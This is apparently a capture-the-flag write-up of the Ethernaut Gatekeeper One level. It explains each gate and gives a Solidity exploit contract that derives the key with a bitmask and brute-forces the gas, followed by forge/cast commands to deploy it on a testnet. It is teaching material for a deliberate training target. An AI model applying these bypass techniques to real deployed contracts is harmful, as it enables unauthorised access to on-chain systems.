@@ -1,0 +1,135 @@
+"This level requires us to go through all three gates (modifiers) to become an entrant. Let's dive in. 
+To get past the gates, we need to understand three concepts. Let's dive in.
+modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+}
+
+This modifier makes sure that the msg.sender should not be the tx.origin. This is similar to Level 04 - Telephone.
+msg.sender
+tx.origin
+To make sure our msg.sender and tx.origin are different, we need to create an intermediary contract that will make function calls to the Gatekeeper contract. This will make our caller's address the tx.origin and our deployed contract's address will be the msg.sender as received by the Gatekeeper. 
+msg.sender
+tx.origin
+tx.origin
+msg.sender
+We will do the third gate before the second one because we need to make sure our logic clears this gate and does not revert due to this. This will make clearing the second gate easier.   
+modifier gateThree(bytes8 _gateKey) {
+    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), ""GatekeeperOne: invalid gateThree part one"");
+    require(uint32(uint64(_gateKey)) != uint64(_gateKey), ""GatekeeperOne: invalid gateThree part two"");
+    require(uint32(uint64(_gateKey)) == uint16(tx.origin), ""GatekeeperOne: invalid gateThree part three"");
+    _;
+}
+
+This gate has three requirements and to properly go through them, we need to understand the concept of data type downcasting and upcasting along with bitmasking. 
+When you convert a bigger data type into a smaller one such as uint32 into uint16, the smaller variable will lose some data. Eg: If I have a variable uint32 someVar = 0x12345678 and I convert it into uint16, I'll be left with 0x5678. 
+uint32
+uint16
+uint32 someVar = 0x12345678
+uint16
+0x5678
+Similarly, if I wanted to convert uint16 into uint32, the above value will become 0x00005678. 
+uint16
+uint32
+0x00005678
+Let's now talk about Bit masking. This is just the & bitwise operation. Eg: 1 AND 0 will be 0. 1 AND 1 will become 1. We will make use of bitmasking when we submit the final key to this gate. 
+&
+1 AND 0
+1 AND 1
+With the above techniques in hand, let's try to clear this gate. Let's assume that we have to send the following value as our key - 0x B1 B2 B3 B4 B5 B6 B7 B8. We are taking 8 bytes because the function enter() needs an argument of bytes8 _gateKey. 
+0x B1 B2 B3 B4 B5 B6 B7 B8
+enter()
+bytes8 _gateKey
+0x B5 B6 B7 B8 == 0x 00 00 B7 B8
+
+0x 00 00 00 00 B5 B6 B7 B8 != 0x B1 B2 B3 B4 B5 B6 B7 B8
+
+0x B5 B6 B7 B8 == 0x 00 00 (last two bytes of tx.origin)
+
+tx.origin
+Therefore, the key will be: 
+0x ANY_DATA ANY_DATA ANY_DATA ANY_DATA 00 00 SECOND_LAST_BYTE_OF_ADDRESS LAST_BYTE_OF_ADDRESS
+
+This was all about data type conversion. Now let's see how the bitmasking comes into play. 
+Since we need to use our tx.origin address to build our key, we can use the AND operation to set the value of B5 and B6 to 0, and the last two bytes (FFFF) to our tx.origin's last two bytes i.e., 
+tx.origin
+tx.origin
+bytes8(uint64(tx.origin) & 0xFFFFFFFF0000FFFF
+
+Here, we are taking uint64 value of tx.origin since we need 8 bytes and doing an AND operation with the value 0xFFFFFFFF0000FFFF. 
+uint64
+tx.origin
+0xFFFFFFFF0000FFFF
+Compare it with our 0xB1B2B3B4B5B6B7B8 example shown above. The first four bytes are all F (not 0), B5 and B6 are 0, and the last two bytes are F because this will help retain our last two address bytes. 
+F
+This will give us our final key needed to clear the gate. 
+modifier gateTwo() {
+    require(gasleft().mod(8191) == 0);
+    _;
+}
+
+gasleft() tells us the remaining gas after the execution of the statement. 
+To clear gate two, we need to make sure that the statement gasleft() % 8191 == 0, i.e., our supplied gas input should be a multiple of 8191. 
+gasleft()
+gasleft() % 8191 == 0
+So how do we decide the exact number of gas to send? There are two ways. 
+Either use Remix debugger to step through each function and when the gasleft statement is reached, count the gas and work backward to arrive at the correct number which is too much work and we won't go there. 
+gasleft
+The other smart move is to just bruteforce the function and increment the gas in each function call until one of the values hits the spot. 
+Let's look at our exploit code:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""../instances/Ilevel13.sol"";
+
+contract LetMeThrough {
+
+    GatekeeperOne level13 = GatekeeperOne(0x27F9AB03aEd76ba2E93Ad7D8AcEE743b1F59b3ee);
+
+    function exploit() external{
+        bytes8 _gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
+        for (uint256 i = 0; i < 300; i++) {
+            (bool success, ) = address(level13).call{gas: i + (8191 * 3)}(abi.encodeWithSignature(""enter(bytes8)"", _gateKey));
+            if (success) {
+                break;
+            }
+        }
+    }
+}
+
+Let us go through the code line by line. 
+exploit()
+_gateKey
+tx.origin
+0xFFFFFFFF0000FFFF
+bytes8
+.call()
+enter()
+for
+i + (8191 * k)
+i
+gasleft()
+k
+i
+k
+i
+enter()
+bool
+success
+Now we just need to deploy this contract on the Rinkeby network and call our exploit() function to trigger the exploit. 
+exploit()
+Let's deploy the contract using the following command:
+forge create LetMeThrough --private-key $PKEY --rpc-url $RPC_URL
+
+
+And call the exploit() function on our contract to become the entrant. 
+exploit()
+cast send 0x0FAE128F303B833b01407FBcA6256E9742097E84 ""exploit()"" --private-key $PKEY --rpc-url $RPC_URL
+
+
+The new entrant can be checked using your console: await contract.entrant()
+await contract.entrant()
+
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+This level teaches us about data types conversion and casting that may or may not lead to a loss of data and the concept of bit masking. 
+Critical functions and modifiers should not implement their logic around gas assumptions as they can be easily bypassed. "
